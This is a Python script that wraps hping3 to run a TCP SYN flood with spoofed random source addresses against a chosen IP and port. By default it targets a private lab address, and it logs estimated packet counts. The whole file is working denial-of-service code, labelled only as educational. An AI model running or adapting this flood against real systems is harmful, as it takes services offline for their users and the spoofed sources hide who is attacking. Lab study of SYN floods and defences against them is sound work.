#!/usr/bin/env python3
# tcp_syn_attacker.py - Educational tool for demonstrating TCP SYN floods
# FOR EDUCATIONAL PURPOSES ONLY - Use only in controlled environments

import time
import argparse
import subprocess
import logging
from contextlib import contextmanager

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger('syn_attacker')


class HpingAttack():
    """SYN flood implementation using hping3"""
    
    def __init__(self, target_ip, target_port, duration, rate):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.rate = rate
        self.start_time = None
        self.packets_sent = 0
        self.running = False
        self.process = None
        
    def _build_command(self):
        """Build the hping3 command"""
        cmd = [
            "hping3",
            "-S",                          # SYN flag
            "--flood",                     # Send packets as fast as possible
            "-p", str(self.target_port),   # Target port
            "--rand-source",               # Use random source IPs
            self.target_ip                 # Target IP
        ]
        return cmd
        
    @contextmanager
    def _capture_output(self, cmd):
        """Capture and process hping3 output"""
        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1
            )
            yield self.process
        finally:
            if self.process:
                try:
                    self.process.terminate()
                    self.process.wait(timeout=2)
                except:
                    self.process.kill()
                self.process = None
    def stop(self):
        """Stop the attack"""
        self.running = False
        if self.start_time:
            duration = time.time() - self.start_time
            rate = self.packets_sent / duration if duration > 0 else 0
            logger.info(f"Attack stopped after {duration:.2f} seconds")
            logger.info(f"Sent approximately {self.packets_sent} SYN packets ({rate:.2f}/sec)")
            
    def is_finished(self):
        """Check if attack duration has elapsed"""
        if not self.start_time or not self.running:
            return True
        return (time.time() - self.start_time) >= self.duration
            
    def start(self):
        """Start hping3 attack"""
        self.start_time = time.time()
        self.running = True
        logger.info(f"Starting SYN flood against {self.target_ip}:{self.target_port}")
        logger.info(f"Attack will run for {self.duration} seconds")
        
        cmd = self._build_command()
        logger.info(f"Executing: {' '.join(cmd)}")
        
        try:
            with self._capture_output(cmd) as process:
                self.process = process
                
                # Monitor process
                start_time = time.time()
                while not self.is_finished() and self.running:
                    # Check if process is still running
                    if process.poll() is not None:
                        stderr = process.stderr.read()
                        logger.error(f"hping3 process ended unexpectedly: {stderr}")
                        break
                        
                    # Update statistics (approximate since hping3 doesn't provide exact counts)
                    elapsed = time.time() - start_time
                    if int(elapsed) % 10 == 0:
                        # Estimate packet count based on typical hping3 performance
                        estimated_rate = min(self.rate, 25000)  # hping3 typically maxes around 25k/sec
                        self.packets_sent = int(elapsed * estimated_rate)
                        logger.info(f"Attack running for {int(elapsed)} seconds (est. {self.packets_sent} packets)")
                        
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
            
        self.stop()



def main():
    """Main function"""
    # Define default values
    defaults = {
        'target_ip': '192.168.56.104',
        'target_port': 8000,
    }
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description="TCP SYN Flood demonstration tool for educational purposes",
        epilog="IMPORTANT: Use only in controlled lab environments"
    )
    parser.add_argument('--target_ip', '-t', default=defaults['target_ip'],
                       help=f"Target IP address (default: {defaults['target_ip']})")
    parser.add_argument('--target_port', '-p', type=int, default=defaults['target_port'],
                       help=f"Target port (default: {defaults['target_port']})")
    parser.add_argument('--duration', '-d', type=int, default=100,
                       help="Attack duration in seconds")
    args = parser.parse_args()
    
    
    # Check for required tools

    try:
        subprocess.run(['which', 'hping3'], check=True, stdout=subprocess.PIPE)
    except subprocess.CalledProcessError:
        logger.error("hping3 not found. Please install it with: sudo apt-get install hping3")


    # Create and execute attack
    attack = HpingAttack(args.target_ip, args.target_port, args.duration, 1000)
    try:
        # Start attack
        attack.start()
        # Wait for attack to complete
        while not attack.is_finished():
            time.sleep(0.5)
    except KeyboardInterrupt:
        logger.info("Attack interrupted")
    finally:
        # Ensure attack is stopped
        attack.stop()

if __name__ == "__main__":
    main()